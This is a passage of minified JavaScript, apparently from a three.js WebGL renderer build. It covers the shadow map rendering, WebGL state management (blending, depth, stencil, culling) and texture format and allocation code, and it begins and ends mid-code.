			mean += depth;
			squared_mean += depth * depth;
		#endif
	}
	mean = mean / samples;
	squared_mean = squared_mean / samples;
	float std_dev = sqrt( max( 0.0, squared_mean - mean * mean ) );
	gl_FragColor = vec4( mean, std_dev, 0.0, 1.0 );
}`,OA=[new B(1,0,0),new B(-1,0,0),new B(0,1,0),new B(0,-1,0),new B(0,0,1),new B(0,0,-1)],FA=[new B(0,-1,0),new B(0,-1,0),new B(0,0,1),new B(0,0,-1),new B(0,-1,0),new B(0,-1,0)],$m=new _t,la=new B,_u=new B;function BA(t,e,n){let i=new gh;const s=new et,r=new et,a=new Mt,o=new Jw,l=new Qw,c={},d=n.maxTextureSize,p={[cs]:mn,[mn]:cs,[xi]:xi},h=new ui({defines:{VSM_SAMPLES:8},uniforms:{shadow_pass:{value:null},resolution:{value:new et},radius:{value:4}},vertexShader:IA,fragmentShader:UA}),f=h.clone();f.defines.HORIZONTAL_PASS=1;const _=new An;_.setAttribute("position",new oi(new Float32Array([-1,-1,.5,3,-1,.5,-1,3,.5]),3));const y=new Ot(_,h),m=this;this.enabled=!1,this.autoUpdate=!0,this.needsUpdate=!1,this.type=ol;let u=this.type;this.render=function(A,R,N){if(m.enabled===!1||m.autoUpdate===!1&&m.needsUpdate===!1||A.length===0)return;A.type===Vb&&(Ne("WebGLShadowMap: PCFSoftShadowMap has been deprecated. Using PCFShadowMap instead."),A.type=ol);const b=t.getRenderTarget(),w=t.getActiveCubeFace(),P=t.getActiveMipmapLevel(),z=t.state;z.setBlending(Ei),z.buffers.depth.getReversed()===!0?z.buffers.color.setClear(0,0,0,0):z.buffers.color.setClear(1,1,1,1),z.buffers.depth.setTest(!0),z.setScissorTest(!1);const V=u!==this.type;V&&R.traverse(function(Z){Z.material&&(Array.isArray(Z.material)?Z.material.forEach($=>$.needsUpdate=!0):Z.material.needsUpdate=!0)});for(let Z=0,$=A.length;Z<$;Z++){const X=A[Z],H=X.shadow;if(H===void 0){Ne("WebGLShadowMap:",X,"has no shadow.");continue}if(H.autoUpdate===!1&&H.needsUpdate===!1)continue;s.copy(H.mapSize);const I=H.getFrameExtents();if(s.multiply(I),r.copy(H.mapSize),(s.x>d||s.y>d)&&(s.x>d&&(r.x=Math.floor(d/I.x),s.x=r.x*I.x,H.mapSize.x=r.x),s.y>d&&(r.y=Math.floor(d/I.y),s.y=r.y*I.y,H.mapSize.y=r.y)),H.map===null||V===!0){if(H.map!==null&&(H.map.depthTexture!==null&&(H.map.depthTexture.dispose(),H.map.depthTexture=null),H.map.dispose()),this.type===ha){if(X.isPointLight){Ne("WebGLShadowMap: VSM shadow maps are not supported for PointLights. Use PCF or BasicShadowMap instead.");continue}H.map=new ai(s.x,s.y,{format:Ur,type:Li,minFilter:Kt,magFilter:Kt,generateMipmaps:!1}),H.map.texture.name=X.name+".shadowMap",H.map.depthTexture=new Ya(s.x,s.y,ti),H.map.depthTexture.name=X.name+".shadowMapDepth",H.map.depthTexture.format=ki,H.map.depthTexture.compareFunction=null,H.map.depthTexture.minFilter=Vt,H.map.depthTexture.magFilter=Vt}else{X.isPointLight?(H.map=new n_(s.x),H.map.depthTexture=new Kw(s.x,li)):(H.map=new ai(s.x,s.y),H.map.depthTexture=new Ya(s.x,s.y,li)),H.map.depthTexture.name=X.name+".shadowMap",H.map.depthTexture.format=ki;const K=t.state.buffers.depth.getReversed();this.type===ol?(H.map.depthTexture.compareFunction=K?hh:ph,H.map.depthTexture.minFilter=Kt,H.map.depthTexture.magFilter=Kt):(H.map.depthTexture.compareFunction=null,H.map.depthTexture.minFilter=Vt,H.map.depthTexture.magFilter=Vt)}H.camera.updateProjectionMatrix()}const J=H.map.isWebGLCubeRenderTarget?6:1;for(let K=0;K<J;K++){if(H.map.isWebGLCubeRenderTarget)t.setRenderTarget(H.map,K),t.clear();else{K===0&&(t.setRenderTarget(H.map),t.clear());const ne=H.getViewport(K);a.set(r.x*ne.x,r.y*ne.y,r.x*ne.z,r.y*ne.w),z.viewport(a)}if(X.isPointLight){const ne=H.camera,we=H.matrix,Pe=X.distance||ne.far;Pe!==ne.far&&(ne.far=Pe,ne.updateProjectionMatrix()),la.setFromMatrixPosition(X.matrixWorld),ne.position.copy(la),_u.copy(ne.position),_u.add(OA[K]),ne.up.copy(FA[K]),ne.lookAt(_u),ne.updateMatrixWorld(),we.makeTranslation(-la.x,-la.y,-la.z),$m.multiplyMatrices(ne.projectionMatrix,ne.matrixWorldInverse),H._frustum.setFromProjectionMatrix($m,ne.coordinateSystem,ne.reversedDepth)}else H.updateMatrices(X);i=H.getFrustum(),S(R,N,H.camera,X,this.type)}H.isPointLightShadow!==!0&&this.type===ha&&g(H,N),H.needsUpdate=!1}u=this.type,m.needsUpdate=!1,t.setRenderTarget(b,w,P)};function g(A,R){const N=e.update(y);h.defines.VSM_SAMPLES!==A.blurSamples&&(h.defines.VSM_SAMPLES=A.blurSamples,f.defines.VSM_SAMPLES=A.blurSamples,h.needsUpdate=!0,f.needsUpdate=!0),A.mapPass===null&&(A.mapPass=new ai(s.x,s.y,{format:Ur,type:Li})),h.uniforms.shadow_pass.value=A.map.depthTexture,h.uniforms.resolution.value=A.mapSize,h.uniforms.radius.value=A.radius,t.setRenderTarget(A.mapPass),t.clear(),t.renderBufferDirect(R,null,N,h,y,null),f.uniforms.shadow_pass.value=A.mapPass.texture,f.uniforms.resolution.value=A.mapSize,f.uniforms.radius.value=A.radius,t.setRenderTarget(A.map),t.clear(),t.renderBufferDirect(R,null,N,f,y,null)}function x(A,R,N,b){let w=null;const P=N.isPointLight===!0?A.customDistanceMaterial:A.customDepthMaterial;if(P!==void 0)w=P;else if(w=N.isPointLight===!0?l:o,t.localClippingEnabled&&R.clipShadows===!0&&Array.isArray(R.clippingPlanes)&&R.clippingPlanes.length!==0||R.displacementMap&&R.displacementScale!==0||R.alphaMap&&R.alphaTest>0||R.map&&R.alphaTest>0||R.alphaToCoverage===!0){const z=w.uuid,V=R.uuid;let Z=c[z];Z===void 0&&(Z={},c[z]=Z);let $=Z[V];$===void 0&&($=w.clone(),Z[V]=$,R.addEventListener("dispose",T)),w=$}if(w.visible=R.visible,w.wireframe=R.wireframe,b===ha?w.side=R.shadowSide!==null?R.shadowSide:R.side:w.side=R.shadowSide!==null?R.shadowSide:p[R.side],w.alphaMap=R.alphaMap,w.alphaTest=R.alphaToCoverage===!0?.5:R.alphaTest,w.map=R.map,w.clipShadows=R.clipShadows,w.clippingPlanes=R.clippingPlanes,w.clipIntersection=R.clipIntersection,w.displacementMap=R.displacementMap,w.displacementScale=R.displacementScale,w.displacementBias=R.displacementBias,w.wireframeLinewidth=R.wireframeLinewidth,w.linewidth=R.linewidth,N.isPointLight===!0&&w.isMeshDistanceMaterial===!0){const z=t.properties.get(w);z.light=N}return w}function S(A,R,N,b,w){if(A.visible===!1)return;if(A.layers.test(R.layers)&&(A.isMesh||A.isLine||A.isPoints)&&(A.castShadow||A.receiveShadow&&w===ha)&&(!A.frustumCulled||i.intersectsObject(A))){A.modelViewMatrix.multiplyMatrices(N.matrixWorldInverse,A.matrixWorld);const V=e.update(A),Z=A.material;if(Array.isArray(Z)){const $=V.groups;for(let X=0,H=$.length;X<H;X++){const I=$[X],J=Z[I.materialIndex];if(J&&J.visible){const K=x(A,J,b,w);A.onBeforeShadow(t,A,R,N,V,K,I),t.renderBufferDirect(N,null,V,K,A,I),A.onAfterShadow(t,A,R,N,V,K,I)}}}else if(Z.visible){const $=x(A,Z,b,w);A.onBeforeShadow(t,A,R,N,V,$,null),t.renderBufferDirect(N,null,V,$,A,null),A.onAfterShadow(t,A,R,N,V,$,null)}}const z=A.children;for(let V=0,Z=z.length;V<Z;V++)S(z[V],R,N,b,w)}function T(A){A.target.removeEventListener("dispose",T);for(const N in c){const b=c[N],w=A.target.uuid;w in b&&(b[w].dispose(),delete b[w])}}}const zA={[vd]:_d,[xd]:bd,[yd]:wd,[Dr]:Sd,[_d]:vd,[bd]:xd,[wd]:yd,[Sd]:Dr};function VA(t,e){function n(){let D=!1;const fe=new Mt;let ae=null;const me=new Mt(0,0,0,0);return{setMask:function(ie){ae!==ie&&!D&&(t.colorMask(ie,ie,ie,ie),ae=ie)},setLocked:function(ie){D=ie},setClear:function(ie,te,oe,De,ct){ct===!0&&(ie*=De,te*=De,oe*=De),fe.set(ie,te,oe,De),me.equals(fe)===!1&&(t.clearColor(ie,te,oe,De),me.copy(fe))},reset:function(){D=!1,ae=null,me.set(-1,0,0,0)}}}function i(){let D=!1,fe=!1,ae=null,me=null,ie=null;return{setReversed:function(te){if(fe!==te){const oe=e.get("EXT_clip_control");te?oe.clipControlEXT(oe.LOWER_LEFT_EXT,oe.ZERO_TO_ONE_EXT):oe.clipControlEXT(oe.LOWER_LEFT_EXT,oe.NEGATIVE_ONE_TO_ONE_EXT),fe=te;const De=ie;ie=null,this.setClear(De)}},getReversed:function(){return fe},setTest:function(te){te?O(t.DEPTH_TEST):ge(t.DEPTH_TEST)},setMask:function(te){ae!==te&&!D&&(t.depthMask(te),ae=te)},setFunc:function(te){if(fe&&(te=zA[te]),me!==te){switch(te){case vd:t.depthFunc(t.NEVER);break;case _d:t.depthFunc(t.ALWAYS);break;case xd:t.depthFunc(t.LESS);break;case Dr:t.depthFunc(t.LEQUAL);break;case yd:t.depthFunc(t.EQUAL);break;case Sd:t.depthFunc(t.GEQUAL);break;case bd:t.depthFunc(t.GREATER);break;case wd:t.depthFunc(t.NOTEQUAL);break;default:t.depthFunc(t.LEQUAL)}me=te}},setLocked:function(te){D=te},setClear:function(te){ie!==te&&(fe&&(te=1-te),t.clearDepth(te),ie=te)},reset:function(){D=!1,ae=null,me=null,ie=null,fe=!1}}}function s(){let D=!1,fe=null,ae=null,me=null,ie=null,te=null,oe=null,De=null,ct=null;return{setTest:function(nt){D||(nt?O(t.STENCIL_TEST):ge(t.STENCIL_TEST))},setMask:function(nt){fe!==nt&&!D&&(t.stencilMask(nt),fe=nt)},setFunc:function(nt,$n,di){(ae!==nt||me!==$n||ie!==di)&&(t.stencilFunc(nt,$n,di),ae=nt,me=$n,ie=di)},setOp:function(nt,$n,di){(te!==nt||oe!==$n||De!==di)&&(t.stencilOp(nt,$n,di),te=nt,oe=$n,De=di)},setLocked:function(nt){D=nt},setClear:function(nt){ct!==nt&&(t.clearStencil(nt),ct=nt)},reset:function(){D=!1,fe=null,ae=null,me=null,ie=null,te=null,oe=null,De=null,ct=null}}}const r=new n,a=new i,o=new s,l=new WeakMap,c=new WeakMap;let d={},p={},h=new WeakMap,f=[],_=null,y=!1,m=null,u=null,g=null,x=null,S=null,T=null,A=null,R=new Ie(0,0,0),N=0,b=!1,w=null,P=null,z=null,V=null,Z=null;const $=t.getParameter(t.MAX_COMBINED_TEXTURE_IMAGE_UNITS);let X=!1,H=0;const I=t.getParameter(t.VERSION);I.indexOf("WebGL")!==-1?(H=parseFloat(/^WebGL (\d)/.exec(I)[1]),X=H>=1):I.indexOf("OpenGL ES")!==-1&&(H=parseFloat(/^OpenGL ES (\d)/.exec(I)[1]),X=H>=2);let J=null,K={};const ne=t.getParameter(t.SCISSOR_BOX),we=t.getParameter(t.VIEWPORT),Pe=new Mt().fromArray(ne),Ge=new Mt().fromArray(we);function Ke(D,fe,ae,me){const ie=new Uint8Array(4),te=t.createTexture();t.bindTexture(D,te),t.texParameteri(D,t.TEXTURE_MIN_FILTER,t.NEAREST),t.texParameteri(D,t.TEXTURE_MAG_FILTER,t.NEAREST);for(let oe=0;oe<ae;oe++)D===t.TEXTURE_3D||D===t.TEXTURE_2D_ARRAY?t.texImage3D(fe,0,t.RGBA,1,1,me,0,t.RGBA,t.UNSIGNED_BYTE,ie):t.texImage2D(fe+oe,0,t.RGBA,1,1,0,t.RGBA,t.UNSIGNED_BYTE,ie);return te}const q={};q[t.TEXTURE_2D]=Ke(t.TEXTURE_2D,t.TEXTURE_2D,1),q[t.TEXTURE_CUBE_MAP]=Ke(t.TEXTURE_CUBE_MAP,t.TEXTURE_CUBE_MAP_POSITIVE_X,6),q[t.TEXTURE_2D_ARRAY]=Ke(t.TEXTURE_2D_ARRAY,t.TEXTURE_2D_ARRAY,1,1),q[t.TEXTURE_3D]=Ke(t.TEXTURE_3D,t.TEXTURE_3D,1,1),r.setClear(0,0,0,1),a.setClear(1),o.setClear(0),O(t.DEPTH_TEST),a.setFunc(Dr),Oe(!1),pt($f),O(t.CULL_FACE),qe(Ei);function O(D){d[D]!==!0&&(t.enable(D),d[D]=!0)}function ge(D){d[D]!==!1&&(t.disable(D),d[D]=!1)}function Ue(D,fe){return p[D]!==fe?(t.bindFramebuffer(D,fe),p[D]=fe,D===t.DRAW_FRAMEBUFFER&&(p[t.FRAMEBUFFER]=fe),D===t.FRAMEBUFFER&&(p[t.DRAW_FRAMEBUFFER]=fe),!0):!1}function ye(D,fe){let ae=f,me=!1;if(D){ae=h.get(fe),ae===void 0&&(ae=[],h.set(fe,ae));const ie=D.textures;if(ae.length!==ie.length||ae[0]!==t.COLOR_ATTACHMENT0){for(let te=0,oe=ie.length;te<oe;te++)ae[te]=t.COLOR_ATTACHMENT0+te;ae.length=ie.length,me=!0}}else ae[0]!==t.BACK&&(ae[0]=t.BACK,me=!0);me&&t.drawBuffers(ae)}function Xe(D){return _!==D?(t.useProgram(D),_=D,!0):!1}const Tt={[Es]:t.FUNC_ADD,[Gb]:t.FUNC_SUBTRACT,[Wb]:t.FUNC_REVERSE_SUBTRACT};Tt[jb]=t.MIN,Tt[Xb]=t.MAX;const Ve={[qb]:t.ZERO,[Yb]:t.ONE,[$b]:t.SRC_COLOR,[md]:t.SRC_ALPHA,[tw]:t.SRC_ALPHA_SATURATE,[Qb]:t.DST_COLOR,[Zb]:t.DST_ALPHA,[Kb]:t.ONE_MINUS_SRC_COLOR,[gd]:t.ONE_MINUS_SRC_ALPHA,[ew]:t.ONE_MINUS_DST_COLOR,[Jb]:t.ONE_MINUS_DST_ALPHA,[nw]:t.CONSTANT_COLOR,[iw]:t.ONE_MINUS_CONSTANT_COLOR,[sw]:t.CONSTANT_ALPHA,[rw]:t.ONE_MINUS_CONSTANT_ALPHA};function qe(D,fe,ae,me,ie,te,oe,De,ct,nt){if(D===Ei){y===!0&&(ge(t.BLEND),y=!1);return}if(y===!1&&(O(t.BLEND),y=!0),D!==Hb){if(D!==m||nt!==b){if((u!==Es||S!==Es)&&(t.blendEquation(t.FUNC_ADD),u=Es,S=Es),nt)switch(D){case Er:t.blendFuncSeparate(t.ONE,t.ONE_MINUS_SRC_ALPHA,t.ONE,t.ONE_MINUS_SRC_ALPHA);break;case Kf:t.blendFunc(t.ONE,t.ONE);break;case Zf:t.blendFuncSeparate(t.ZERO,t.ONE_MINUS_SRC_COLOR,t.ZERO,t.ONE);break;case Jf:t.blendFuncSeparate(t.DST_COLOR,t.ONE_MINUS_SRC_ALPHA,t.ZERO,t.ONE);break;default:Qe("WebGLState: Invalid blending: ",D);break}else switch(D){case Er:t.blendFuncSeparate(t.SRC_ALPHA,t.ONE_MINUS_SRC_ALPHA,t.ONE,t.ONE_MINUS_SRC_ALPHA);break;case Kf:t.blendFuncSeparate(t.SRC_ALPHA,t.ONE,t.ONE,t.ONE);break;case Zf:Qe("WebGLState: SubtractiveBlending requires material.premultipliedAlpha = true");break;case Jf:Qe("WebGLState: MultiplyBlending requires material.premultipliedAlpha = true");break;default:Qe("WebGLState: Invalid blending: ",D);break}g=null,x=null,T=null,A=null,R.set(0,0,0),N=0,m=D,b=nt}return}ie=ie||fe,te=te||ae,oe=oe||me,(fe!==u||ie!==S)&&(t.blendEquationSeparate(Tt[fe],Tt[ie]),u=fe,S=ie),(ae!==g||me!==x||te!==T||oe!==A)&&(t.blendFuncSeparate(Ve[ae],Ve[me],Ve[te],Ve[oe]),g=ae,x=me,T=te,A=oe),(De.equals(R)===!1||ct!==N)&&(t.blendColor(De.r,De.g,De.b,ct),R.copy(De),N=ct),m=D,b=!1}function tt(D,fe){D.side===xi?ge(t.CULL_FACE):O(t.CULL_FACE);let ae=D.side===mn;fe&&(ae=!ae),Oe(ae),D.blending===Er&&D.transparent===!1?qe(Ei):qe(D.blending,D.blendEquation,D.blendSrc,D.blendDst,D.blendEquationAlpha,D.blendSrcAlpha,D.blendDstAlpha,D.blendColor,D.blendAlpha,D.premultipliedAlpha),a.setFunc(D.depthFunc),a.setTest(D.depthTest),a.setMask(D.depthWrite),r.setMask(D.colorWrite);const me=D.stencilWrite;o.setTest(me),me&&(o.setMask(D.stencilWriteMask),o.setFunc(D.stencilFunc,D.stencilRef,D.stencilFuncMask),o.setOp(D.stencilFail,D.stencilZFail,D.stencilZPass)),yt(D.polygonOffset,D.polygonOffsetFactor,D.polygonOffsetUnits),D.alphaToCoverage===!0?O(t.SAMPLE_ALPHA_TO_COVERAGE):ge(t.SAMPLE_ALPHA_TO_COVERAGE)}function Oe(D){w!==D&&(D?t.frontFace(t.CW):t.frontFace(t.CCW),w=D)}function pt(D){D!==Bb?(O(t.CULL_FACE),D!==P&&(D===$f?t.cullFace(t.BACK):D===zb?t.cullFace(t.FRONT):t.cullFace(t.FRONT_AND_BACK))):ge(t.CULL_FACE),P=D}function k(D){D!==z&&(X&&t.lineWidth(D),z=D)}function yt(D,fe,ae){D?(O(t.POLYGON_OFFSET_FILL),(V!==fe||Z!==ae)&&(t.polygonOffset(fe,ae),V=fe,Z=ae)):ge(t.POLYGON_OFFSET_FILL)}function Ze(D){D?O(t.SCISSOR_TEST):ge(t.SCISSOR_TEST)}function at(D){D===void 0&&(D=t.TEXTURE0+$-1),J!==D&&(t.activeTexture(D),J=D)}function Se(D,fe,ae){ae===void 0&&(J===null?ae=t.TEXTURE0+$-1:ae=J);let me=K[ae];me===void 0&&(me={type:void 0,texture:void 0},K[ae]=me),(me.type!==D||me.texture!==fe)&&(J!==ae&&(t.activeTexture(ae),J=ae),t.bindTexture(D,fe||q[D]),me.type=D,me.texture=fe)}function C(){const D=K[J];D!==void 0&&D.type!==void 0&&(t.bindTexture(D.type,null),D.type=void 0,D.texture=void 0)}function v(){try{t.compressedTexImage2D(...arguments)}catch(D){Qe("WebGLState:",D)}}function L(){try{t.compressedTexImage3D(...arguments)}catch(D){Qe("WebGLState:",D)}}function Y(){try{t.texSubImage2D(...arguments)}catch(D){Qe("WebGLState:",D)}}function Q(){try{t.texSubImage3D(...arguments)}catch(D){Qe("WebGLState:",D)}}function j(){try{t.compressedTexSubImage2D(...arguments)}catch(D){Qe("WebGLState:",D)}}function Te(){try{t.compressedTexSubImage3D(...arguments)}catch(D){Qe("WebGLState:",D)}}function le(){try{t.texStorage2D(...arguments)}catch(D){Qe("WebGLState:",D)}}function Me(){try{t.texStorage3D(...arguments)}catch(D){Qe("WebGLState:",D)}}function ke(){try{t.texImage2D(...arguments)}catch(D){Qe("WebGLState:",D)}}function re(){try{t.texImage3D(...arguments)}catch(D){Qe("WebGLState:",D)}}function ue(D){Pe.equals(D)===!1&&(t.scissor(D.x,D.y,D.z,D.w),Pe.copy(D))}function be(D){Ge.equals(D)===!1&&(t.viewport(D.x,D.y,D.z,D.w),Ge.copy(D))}function Ee(D,fe){let ae=c.get(fe);ae===void 0&&(ae=new WeakMap,c.set(fe,ae));let me=ae.get(D);me===void 0&&(me=t.getUniformBlockIndex(fe,D.name),ae.set(D,me))}function ce(D,fe){const me=c.get(fe).get(D);l.get(fe)!==me&&(t.uniformBlockBinding(fe,me,D.__bindingPointIndex),l.set(fe,me))}function ze(){t.disable(t.BLEND),t.disable(t.CULL_FACE),t.disable(t.DEPTH_TEST),t.disable(t.POLYGON_OFFSET_FILL),t.disable(t.SCISSOR_TEST),t.disable(t.STENCIL_TEST),t.disable(t.SAMPLE_ALPHA_TO_COVERAGE),t.blendEquation(t.FUNC_ADD),t.blendFunc(t.ONE,t.ZERO),t.blendFuncSeparate(t.ONE,t.ZERO,t.ONE,t.ZERO),t.blendColor(0,0,0,0),t.colorMask(!0,!0,!0,!0),t.clearColor(0,0,0,0),t.depthMask(!0),t.depthFunc(t.LESS),a.setReversed(!1),t.clearDepth(1),t.stencilMask(4294967295),t.stencilFunc(t.ALWAYS,0,4294967295),t.stencilOp(t.KEEP,t.KEEP,t.KEEP),t.clearStencil(0),t.cullFace(t.BACK),t.frontFace(t.CCW),t.polygonOffset(0,0),t.activeTexture(t.TEXTURE0),t.bindFramebuffer(t.FRAMEBUFFER,null),t.bindFramebuffer(t.DRAW_FRAMEBUFFER,null),t.bindFramebuffer(t.READ_FRAMEBUFFER,null),t.useProgram(null),t.lineWidth(1),t.scissor(0,0,t.canvas.width,t.canvas.height),t.viewport(0,0,t.canvas.width,t.canvas.height),d={},J=null,K={},p={},h=new WeakMap,f=[],_=null,y=!1,m=null,u=null,g=null,x=null,S=null,T=null,A=null,R=new Ie(0,0,0),N=0,b=!1,w=null,P=null,z=null,V=null,Z=null,Pe.set(0,0,t.canvas.width,t.canvas.height),Ge.set(0,0,t.canvas.width,t.canvas.height),r.reset(),a.reset(),o.reset()}return{buffers:{color:r,depth:a,stencil:o},enable:O,disable:ge,bindFramebuffer:Ue,drawBuffers:ye,useProgram:Xe,setBlending:qe,setMaterial:tt,setFlipSided:Oe,setCullFace:pt,setLineWidth:k,setPolygonOffset:yt,setScissorTest:Ze,activeTexture:at,bindTexture:Se,unbindTexture:C,compressedTexImage2D:v,compressedTexImage3D:L,texImage2D:ke,texImage3D:re,updateUBOMapping:Ee,uniformBlockBinding:ce,texStorage2D:le,texStorage3D:Me,texSubImage2D:Y,texSubImage3D:Q,compressedTexSubImage2D:j,compressedTexSubImage3D:Te,scissor:ue,viewport:be,reset:ze}}function HA(t,e,n,i,s,r,a){const o=e.has("WEBGL_multisampled_render_to_texture")?e.get("WEBGL_multisampled_render_to_texture"):null,l=typeof navigator>"u"?!1:/OculusBrowser/g.test(navigator.userAgent),c=new et,d=new WeakMap;let p;const h=new WeakMap;let f=!1;try{f=typeof OffscreenCanvas<"u"&&new OffscreenCanvas(1,1).getContext("2d")!==null}catch{}function _(C,v){return f?new OffscreenCanvas(C,v):zl("canvas")}function y(C,v,L){let Y=1;const Q=Se(C);if((Q.width>L||Q.height>L)&&(Y=L/Math.max(Q.width,Q.height)),Y<1)if(typeof HTMLImageElement<"u"&&C instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&C instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&C instanceof ImageBitmap||typeof VideoFrame<"u"&&C instanceof VideoFrame){const j=Math.floor(Y*Q.width),Te=Math.floor(Y*Q.height);p===void 0&&(p=_(j,Te));const le=v?_(j,Te):p;return le.width=j,le.height=Te,le.getContext("2d").drawImage(C,0,0,j,Te),Ne("WebGLRenderer: Texture has been resized from ("+Q.width+"x"+Q.height+") to ("+j+"x"+Te+")."),le}else return"data"in C&&Ne("WebGLRenderer: Image in DataTexture is too big ("+Q.width+"x"+Q.height+")."),C;return C}function m(C){return C.generateMipmaps}function u(C){t.generateMipmap(C)}function g(C){return C.isWebGLCubeRenderTarget?t.TEXTURE_CUBE_MAP:C.isWebGL3DRenderTarget?t.TEXTURE_3D:C.isWebGLArrayRenderTarget||C.isCompressedArrayTexture?t.TEXTURE_2D_ARRAY:t.TEXTURE_2D}function x(C,v,L,Y,Q=!1){if(C!==null){if(t[C]!==void 0)return t[C];Ne("WebGLRenderer: Attempt to use non-existing WebGL internal format '"+C+"'")}let j=v;if(v===t.RED&&(L===t.FLOAT&&(j=t.R32F),L===t.HALF_FLOAT&&(j=t.R16F),L===t.UNSIGNED_BYTE&&(j=t.R8)),v===t.RED_INTEGER&&(L===t.UNSIGNED_BYTE&&(j=t.R8UI),L===t.UNSIGNED_SHORT&&(j=t.R16UI),L===t.UNSIGNED_INT&&(j=t.R32UI),L===t.BYTE&&(j=t.R8I),L===t.SHORT&&(j=t.R16I),L===t.INT&&(j=t.R32I)),v===t.RG&&(L===t.FLOAT&&(j=t.RG32F),L===t.HALF_FLOAT&&(j=t.RG16F),L===t.UNSIGNED_BYTE&&(j=t.RG8)),v===t.RG_INTEGER&&(L===t.UNSIGNED_BYTE&&(j=t.RG8UI),L===t.UNSIGNED_SHORT&&(j=t.RG16UI),L===t.UNSIGNED_INT&&(j=t.RG32UI),L===t.BYTE&&(j=t.RG8I),L===t.SHORT&&(j=t.RG16I),L===t.INT&&(j=t.RG32I)),v===t.RGB_INTEGER&&(L===t.UNSIGNED_BYTE&&(j=t.RGB8UI),L===t.UNSIGNED_SHORT&&(j=t.RGB16UI),L===t.UNSIGNED_INT&&(j=t.RGB32UI),L===t.BYTE&&(j=t.RGB8I),L===t.SHORT&&(j=t.RGB16I),L===t.INT&&(j=t.RGB32I)),v===t.RGBA_INTEGER&&(L===t.UNSIGNED_BYTE&&(j=t.RGBA8UI),L===t.UNSIGNED_SHORT&&(j=t.RGBA16UI),L===t.UNSIGNED_INT&&(j=t.RGBA32UI),L===t.BYTE&&(j=t.RGBA8I),L===t.SHORT&&(j=t.RGBA16I),L===t.INT&&(j=t.RGBA32I)),v===t.RGB&&(L===t.UNSIGNED_INT_5_9_9_9_REV&&(j=t.RGB9_E5),L===t.UNSIGNED_INT_10F_11F_11F_REV&&(j=t.R11F_G11F_B10F)),v===t.RGBA){const Te=Q?Fl:Ye.getTransfer(Y);L===t.FLOAT&&(j=t.RGBA32F),L===t.HALF_FLOAT&&(j=t.RGBA16F),L===t.UNSIGNED_BYTE&&(j=Te===st?t.SRGB8_ALPHA8:t.RGBA8),L===t.UNSIGNED_SHORT_4_4_4_4&&(j=t.RGBA4),L===t.UNSIGNED_SHORT_5_5_5_1&&(j=t.RGB5_A1)}return(j===t.R16F||j===t.R32F||j===t.RG16F||j===t.RG32F||j===t.RGBA16F||j===t.RGBA32F)&&e.get("EXT_color_buffer_float"),j}function S(C,v){let L;return C?v===null||v===li||v===Xa?L=t.DEPTH24_STENCIL8:v===ti?L=t.DEPTH32F_STENCIL8:v===ja&&(L=t.DEPTH24_STENCIL8,Ne("DepthTexture: 16 bit depth attachment is not supported with stencil. Using 24-bit attachment.")):v===null||v===li||v===Xa?L=t.DEPTH_COMPONENT24:v===ti?L=t.DEPTH_COMPONENT32F:v===ja&&(L=t.DEPTH_COMPONENT16),L}function T(C,v){return m(C)===!0||C.isFramebufferTexture&&C.minFilter!==Vt&&C.minFilter!==Kt?Math.log2(Math.max(v.width,v.height))+1:C.mipmaps!==void 0&&C.mipmaps.length>0?C.mipmaps.length:C.isCompressedTexture&&Array.isArray(C.image)?v.mipmaps.length:1}function A(C){const v=C.target;v.removeEventListener("dispose",A),N(v),v.isVideoTexture&&d.delete(v)}function R(C){const v=C.target;v.removeEventListener("dispose",R),w(v)}function N(C){const v=i.get(C);if(v.__webglInit===void 0)return;const L=C.source,Y=h.get(L);if(Y){const Q=Y[v.__cacheKey];Q.usedTimes--,Q.usedTimes===0&&b(C),Object.keys(Y).length===0&&h.delete(L)}i.remove(C)}function b(C){const v=i.get(C);t.deleteTexture(v.__webglTexture);const L=C.source,Y=h.get(L);delete Y[v.__cacheKey],a.memory.textures--}function w(C){const v=i.get(C);if(C.depthTexture&&(C.depthTexture.dispose(),i.remove(C.depthTexture)),C.isWebGLCubeRenderTarget)for(let Y=0;Y<6;Y++){if(Array.isArray(v.__webglFramebuffer[Y]))for(let Q=0;Q<v.__webglFramebuffer[Y].length;Q++)t.deleteFramebuffer(v.__webglFramebuffer[Y][Q]);else t.deleteFramebuffer(v.__webglFramebuffer[Y]);v.__webglDepthbuffer&&t.deleteRenderbuffer(v.__webglDepthbuffer[Y])}else{if(Array.isArray(v.__webglFramebuffer))for(let Y=0;Y<v.__webglFramebuffer.length;Y++)t.deleteFramebuffer(v.__webglFramebuffer[Y]);else t.deleteFramebuffer(v.__webglFramebuffer);if(v.__webglDepthbuffer&&t.deleteRenderbuffer(v.__webglDepthbuffer),v.__webglMultisampledFramebuffer&&t.deleteFramebuffer(v.__webglMultisampledFramebuffer),v.__webglColorRenderbuffer)for(let Y=0;Y<v.__webglColorRenderbuffer.length;Y++)v.__webglColorRenderbuffer[Y]&&t.deleteRenderbuffer(v.__webglColorRenderbuffer[Y]);v.__webglDepthRenderbuffer&&t.deleteRenderbuffer(v.__webglDepthRenderbuffer)}const L=C.textures;for(let Y=0,Q=L.length;Y<Q;Y++){const j=i.get(L[Y]);j.__webglTexture&&(t.deleteTexture(j.__webglTexture),a.memory.textures--),i.remove(L[Y])}i.remove(C)}let P=0;function z(){P=0}function V(){const C=P;return C>=s.maxTextures&&Ne("WebGLTextures: Trying to use "+C+" texture units while this GPU supports only "+s.maxTextures),P+=1,C}function Z(C){const v=[];return v.push(C.wrapS),v.push(C.wrapT),v.push(C.wrapR||0),v.push(C.magFilter),v.push(C.minFilter),v.push(C.anisotropy),v.push(C.internalFormat),v.push(C.format),v.push(C.type),v.push(C.generateMipmaps),v.push(C.premultiplyAlpha),v.push(C.flipY),v.push(C.unpackAlignment),v.push(C.colorSpace),v.join()}function $(C,v){const L=i.get(C);if(C.isVideoTexture&&Ze(C),C.isRenderTargetTexture===!1&&C.isExternalTexture!==!0&&C.version>0&&L.__version!==C.version){const Y=C.image;if(Y===null)Ne("WebGLRenderer: Texture marked for update but no image data found.");else if(Y.complete===!1)Ne("WebGLRenderer: Texture marked for update but image is incomplete");else{q(L,C,v);return}}else C.isExternalTexture&&(L.__webglTexture=C.sourceTexture?C.sourceTexture:null);n.bindTexture(t.TEXTURE_2D,L.__webglTexture,t.TEXTURE0+v)}function X(C,v){const L=i.get(C);if(C.isRenderTargetTexture===!1&&C.version>0&&L.__version!==C.version){q(L,C,v);return}else 